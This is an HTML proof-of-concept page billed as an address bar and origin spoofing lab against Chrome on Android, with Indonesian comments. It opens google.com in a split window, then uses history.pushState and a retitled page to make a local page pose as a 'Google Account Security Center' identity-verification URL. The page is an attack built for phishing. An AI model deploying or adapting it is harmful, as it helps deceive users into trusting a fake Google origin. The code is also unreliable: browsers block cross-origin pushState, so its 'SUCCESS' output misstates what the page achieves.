<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Address Bar & Origin Spoofing PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #0b0e14;
            color: #f0f6fc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 12px;
            color: #ff7b72;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
        }
        h1 {
            font-size: 18px;
            color: #ffffff;
            margin-bottom: 24px;
        }
        .container {
            width: 100%;
            max-width: 380px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #da3633;
            color: white;
            padding: 16px 24px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
            transition: background-color 0.2s, transform 0.1s;
            width: 100%;
            box-sizing: border-box;
        }
        a.spoof-link:active {
            background-color: #b62324;
            transform: scale(0.98);
        }
        .file-info {
            margin-top: 20px;
            font-size: 13px;
            color: #8b949e;
            word-break: break-all;
            background: #161b22;
            padding: 12px;
            border-radius: 6px;
            width: 85%;
            max-width: 400px;
            border: 1px solid #30363d;
            text-align: left;
            font-family: monospace;
        }
        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #484f58;
        }
    </style>
</head>
<body>

    <div class="banner">Address Bar Spoofing Lab</div>
    <h1>Multi-Window Origin Confusion Vector</h1>

    <div class="container">
        <!-- 1 Tombol Master: Panel Atas memuat Google.com, Panel Bawah mengeksekusi Spoofing State -->
        <a href="https://www.google.com" class="spoof-link" id="masterSpoofBtn">
            Open Window & Execute Origin Spoofing
        </a>
    </div>

    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
    <div class="footer-note">Target: Chromium Address Bar & Origin State Synchronization.</div>

    <script>
        let isExecuting = false;

        const triggerAddressBarSpoof = () => {
            if (isExecuting) return;
            isExecuting = true;

            const infoBox = document.getElementById("fileInfo");
            infoBox.innerHTML = `[+] Multi-window split detected.<br>[*] Initializing race condition window sync...`;

            // Jeda 2300ms dirancang untuk memastikan window manager Android 
            // menyelesaikan pemisahan panel atas (google.com) sebelum state URL di bawah dimanipulasi.
            setTimeout(() => {
                try {
                    infoBox.innerHTML = `[+] Injecting spoofed history state & origin context...`;
                    
                    // Memanfaatkan History API (pushState) untuk memanipulasi tampilan address bar lokal
                    // seolah-olah domain origin berubah menjadi subdomain tepercaya di panel bawah.
                    const spoofedURL = "https://www.google.com/security/verify-identity";
                    window.history.pushState({ id: "spoofed_context" }, "Google Security", spoofedURL);

                    // Memaksa pembaruan dokumen secara asinkron untuk menguji kebingungan render UI address bar
                    document.title = "Google Account Security Center";
                    
                    infoBox.innerHTML = `[⚡ SUCCESS] Origin state modified.<br>Current location API: ${window.location.href}`;
                } catch (err) {
                    infoBox.innerHTML = `[-] Spoofing execution trapped: ${err.message}`;
                    console.debug("Address bar spoof error:", err.message);
                } finally {
                    setTimeout(() => { isExecuting = false; }, 2000);
                }
            }, 2300);
        };

        const masterElement = document.getElementById("masterSpoofBtn");
        
        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
        masterElement.addEventListener("contextmenu", (e) => {
            triggerAddressBarSpoof();
        });
        
        masterElement.addEventListener("touchstart", () => {}, { passive: true });
    </script>

</body>
</html>
